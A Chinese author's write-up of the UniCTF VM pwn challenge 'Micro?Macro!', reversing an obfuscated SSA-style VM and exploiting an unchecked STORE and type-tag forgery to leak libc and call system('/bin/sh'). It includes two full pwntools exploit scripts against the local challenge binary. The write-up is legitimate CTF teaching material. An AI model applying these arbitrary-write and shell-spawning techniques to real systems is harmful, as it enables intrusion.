# UniCTF - Micro?Macro!

出这道题的缘由其实是前段时间学 LLVM 的时候看到 SSA 的部分，感觉挺有意思的，就在 AI 的协助下搓了这个系列的题，ret2libc 又太无聊了，都做 VM PWN 了你还搁着 ret2libc 呢？所以就想了一下，可以通过 VM 的运行机制直接一步获取 shell，并且绕过 ASLR 和 PIE 的保护。这道题和另一道题是一个系列的，其实本来就直接叫 SSA，后来感觉太单调了，没意思，就参考 AI 的意见，想了一个这个名字。原因其实是这道题对指令进行了混淆，操作时要使用指令码，而给的漏洞其实非常直白，而且利用面很广，所以我觉得还是挺切题的哈哈。

---

## 分析

拿到二进制后，先做常规的 `checksec`，确认保护信息与后续利用方向，可以看见保护全开，符号表也被去掉了：

```bash
❯ checksec vuln
[*] '/home/neptune/unictf/Micro?Macro!/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

程序交互非常简单，只提供一个“指令编排 + 执行”的 VM：

- `inst <opcode> [params]`：添加一条指令到程序缓冲区
- `run`：依次执行已编排的指令
- `dbg`：打印随机的寄存器槽位索引 `rand_slot`
- `help` / `exit`：辅助命令

---

## 数据结构还原

逆向 `init`、`addInst`、以及各 `op_handler_x`，就可以还原出两个核心结构体：

### 1) 寄存器槽位（values）

`values` 通过 `memset` 清零 0x200 字节，且访问方式是 `values + 16 * idx`，因此可视为 32 个槽位，每个槽位 16 字节：

```c
typedef struct {
		uint32_t tag;   // 0: 整数, 1: 指针, 2: 函数指针
		uint32_t pad;
		uint64_t data;  // 整数、指针或函数指针
} Slot; // sizeof(Slot) = 0x10

Slot values[32];
```

程序中另有 `qword_50C8`，其实是 `values + 8` 的别名，用来取 `data` 字段：

```
qword_50C8[2 * idx] == values[idx].data
```

初始化时会随机选一个槽位：

- `rand_slot = rand() % 32`，且确保在 16~31 之间
- `values[rand_slot].tag = 1`
- `values[rand_slot].data = &values`

这意味着有一个“已知类型为指针的寄存器”，其值指向 `values` 基址。不给这个的话还真不好搞，特别是另一题保护更多。

### 2) 指令缓冲区（program）

`program` 大小 0x600，每条指令 24 字节，因此最多 64 条：

```c
typedef struct {
		uint8_t  opcode;
		uint32_t a;
		uint32_t b;
		uint32_t c;
		uint64_t imm;
} Inst; // sizeof(Inst) = 0x18

Inst program[64];
```

`addInst` 解析用户输入后写入 `program`，`run` 依次执行。

---

## 指令集与语义

`decode_opcode` 通过一层跳转表和 `opcode_map` 做映射，做了一坨混淆，但是其实没什么用，把汇编扔给 AI 分析就知道其实逻辑等价于：

```c
int decode_opcode(uint8_t encoded_op) {
    for (int i = 0; i < 8; i++) {
        if (opcode_map[i] == encoded_op) {
             return i;
        }
    }
    return -1;
}
```

实际有效的 opcode 字节如下：

| opcode | 处理函数 | 语义 |
| --- | --- | --- |
| `0x3A` | `op_handler_0` | CONST：`dst = imm`（tag=0） |
| `0x7E` | `op_handler_1` | ADD：立即数相加或指针+偏移 |
| `0x91` | `op_handler_2` | PHI：按条件拷贝一个槽位 |
| `0x52` | `op_handler_3` | LOAD：`dst = *(ptr)`（要求 src.tag=1） |
| `0xC4` | `op_handler_4` | STORE：`*(ptr) = imm`（要求 dst.tag=1, src.tag=0） |
| `0x1B` | `op_handler_5` | CALL：调用函数指针（要求 func.tag=2） |
| `0x68` | `op_handler_6` | PRINT：输出槽位内容 |
| `0xAF` | `op_handler_7` | EXIT |

语义细节：

- **CONST**：`values[dst].tag = 0`，`values[dst].data = imm`。
- **ADD**：
	- `tag=0 + tag=0`：结果仍为立即数。
	- `tag=1 + tag=0`：指针算术，结果 `tag=1`，可以通过这个操作从随机槽位获取指针。
- **LOAD**：
	- `src.tag=1` 且 `src.data != NULL` 时，将 `*(uint64_t*)src.data` 读入 `dst`，并设置 `dst.tag=0`。
- **STORE**：
	- `dst.tag=1` 且 `src.tag=0`，执行 `*(uint64_t*)dst.data = src.data`。
- **CALL**：
	- `func.tag=2` 时调用 `func.data(arg)`，其中 `arg` 取自另一个槽位，若参数槽位 `tag=0/1` 则取其 `data`。

## 漏洞点分析

漏洞核心在 STORE 的任意地址写 + 类型字段可被改写：

1. 初始化就给了一个指向 `values` 基址的指针槽位（`rand_slot`）。
2. `ADD` 允许指针 + 立即数的运算，因此可以构造任意地址指针：
	 - 以 `&values` 为基址，加上已知偏移即可定位到 GOT、`values` 内部字段等任意位置。
3. `STORE` 对写入地址没有任何边界检查。

因此可以：

- 通过 `&values + 偏移` 读取 GOT 中函数地址，完成 libc 泄漏；
- 通过 `STORE` 改写 `values[某槽位].tag`，把“立即数槽位”伪造成“函数指针槽位”，从而触发 `CALL` 执行任意函数。

---

## 利用思路

### 确定指针基址槽位

执行 `dbg` 得到 `rand_slot`。该槽位满足：

```
values[rand_slot].tag = 1
values[rand_slot].data = &values
```

这是后续一切地址计算的基址。

### 泄漏 libc 地址

使用 `ADD` 构造 `puts@GOT` 指针，再用 `LOAD` 读取实际地址：

1. 计算 `offset_puts = got.puts - &values`（静态从 ELF 得到）
2. `ptr = values[rand_slot] + offset_puts`
3. `puts_addr = *ptr`

一旦拿到 `puts` 实际地址，而因为即使开始 PIE 和 ASLR，函数间偏移也是不变的，就可以计算：

```
system_addr = puts_addr + (system - puts)
binsh_addr  = puts_addr + ("/bin/sh" - puts)
```

### 伪造函数指针类型

`system_addr` 目前在一个“立即数槽位”中（tag=0），而 `CALL` 需要 tag=2。

利用 `STORE` 写 `values[slot].tag = 2` 即可完成类型伪造。

写入地址的计算方式：

```
tag_addr = &values + slot_index * 0x10
```

用 `rand_slot` 指针加偏移算出 `tag_addr`，再 `STORE` 写入常数 2。

### CALL system("/bin/sh")

当 `system_addr` 所在槽位被标记为 `tag=2` 后，直接使用 `CALL` 指令执行：

```
CALL system_slot, binsh_slot
```

即可拿到 shell。

## 指令序列

核心思路：

```
CONST  r_off_puts,   offset_puts
ADD    r_ptr_puts,   rand_slot, r_off_puts
LOAD   r_puts,       r_ptr_puts

CONST  r_off_system, offset_system
ADD    r_system,     r_puts, r_off_system
CONST  r_off_binsh,  offset_binsh
ADD    r_binsh,      r_puts, r_off_binsh

CONST  r_tag_value,  2
CONST  r_tag_off,    slot_index*0x10
ADD    r_tag_ptr,    rand_slot, r_tag_off
STORE  r_tag_ptr,    r_tag_value

CALL   r_system,     r_binsh
```

## exp

`/bin/sh` 可以用 libc 的，也可以直接写入槽位，本题是没有作什么限制，所以给出下面两个题解，第一个是用的 libc 的，第二个直接写入槽位，加了注释：

EXP1：

```python
#!/usr/bin/env python3
from pwn import *

context(log_level="info", arch="amd64")

io = process("./vuln_patched")
# io = remote("localhost", 9999)
elf = ELF("./vuln_patched")
libc = ELF("./libc.so.6")

OP_CONST = 0x3A
OP_ADD = 0x7E
OP_LOAD = 0x52
OP_STORE = 0xC4
OP_CALL = 0x1B


def cmd(c):
    io.sendlineafter(b"> ", c.encode())


def inst(op, *args):
    cmd(f"inst {op} " + " ".join(map(str, args)))


cmd("dbg")
io.recvuntil(b"[*] rand_slot = ")
rand_slot = int(io.recvline().strip())
log.success(f"rand_slot: {rand_slot}")

offset_puts = elf.got["puts"] - elf.symbols["values"]
offset_system = libc.symbols["system"] - libc.symbols["puts"]
offset_binsh = next(libc.search(b"/bin/sh\x00")) - libc.symbols["puts"]

inst(OP_CONST, 2, offset_puts)
inst(OP_ADD, 3, rand_slot, 2)
inst(OP_LOAD, 4, 3)
inst(OP_CONST, 5, offset_system)
inst(OP_ADD, 6, 4, 5)
inst(OP_CONST, 7, offset_binsh)
inst(OP_ADD, 8, 4, 7)
inst(OP_CONST, 9, 96)
inst(OP_ADD, 10, rand_slot, 9)
inst(OP_CONST, 12, 2)
inst(OP_STORE, 10, 12)
inst(OP_CALL, 6, 8)

cmd("run")
io.interactive()
```

EXP2:

```python
#!/usr/bin/env python3
from pwn import *

context(log_level="info", arch="amd64")

io = process("./vuln_patched")
# io = remote("localhost", 9999)
elf = ELF("./vuln_patched")
libc = ELF("./libc.so.6")

OP_CONST = 0x3A
OP_ADD = 0x7E
OP_LOAD = 0x52
OP_STORE = 0xC4
OP_CALL = 0x1B


def cmd(c):
    io.sendlineafter(b"> ", c.encode())


def inst(op, *args):
    cmd(f"inst {op} " + " ".join(map(str, args)))


cmd("dbg")
io.recvuntil(b"[*] rand_slot = ")
rand_slot = int(io.recvline().strip())
log.success(f"rand_slot: {rand_slot}")

offset_puts = elf.got["puts"] - elf.symbols["values"]
offset_system = libc.symbols["system"] - libc.symbols["puts"]

# values[2] = offset_puts (TYPE_INT)
inst(OP_CONST, 2, offset_puts)
# values[3] = &values[0] + offset_puts = &puts_got (TYPE_PTR)
inst(OP_ADD, 3, rand_slot, 2)
# values[4] = *values[3] = puts@libc
inst(OP_LOAD, 4, 3)
# values[5] = offset_system (TYPE_INT)
inst(OP_CONST, 5, offset_system)
# values[6] = puts@libc + offset_system = system@libc
inst(OP_ADD, 6, 4, 5)
# values[7] = "/bin/sh\x00" (TYPE_INT)
inst(OP_CONST, 7, u64(b"/bin/sh\x00"))
# values[8] = 7 * 16 (sizeof(SSAValue)) + 8 (offsetof(data))
inst(OP_CONST, 8, 7 * 16 + 8)
# values[9] = &values[0] + offset_str = &values[7].data (TYPE_PTR)
inst(OP_ADD, 9, rand_slot, 8)
# values[10] = 96 (offset of values[6] -> 6*16)
inst(OP_CONST, 10, 96)
# values[11] = &values[0] + 96 = &values[6] (TYPE_PTR)
inst(OP_ADD, 11, rand_slot, 10)
# values[12] = 2 (TYPE_FUNC)
inst(OP_CONST, 12, 2)
# *values[11] = values[12] -> values[6].type = TYPE_FUNC
inst(OP_STORE, 11, 12)
# call values[6](values[9]) -> system("/bin/sh")
inst(OP_CALL, 6, 9)

cmd("run")
io.interactive()
```

其实我感觉因为漏洞给得挺大的，应该还有别的非预期解，不过我懒得去改了，非预期也挺好的，毕竟我太菜了，学学各位大佬思路，不过我试了一下打 one_gadget 似乎不行（
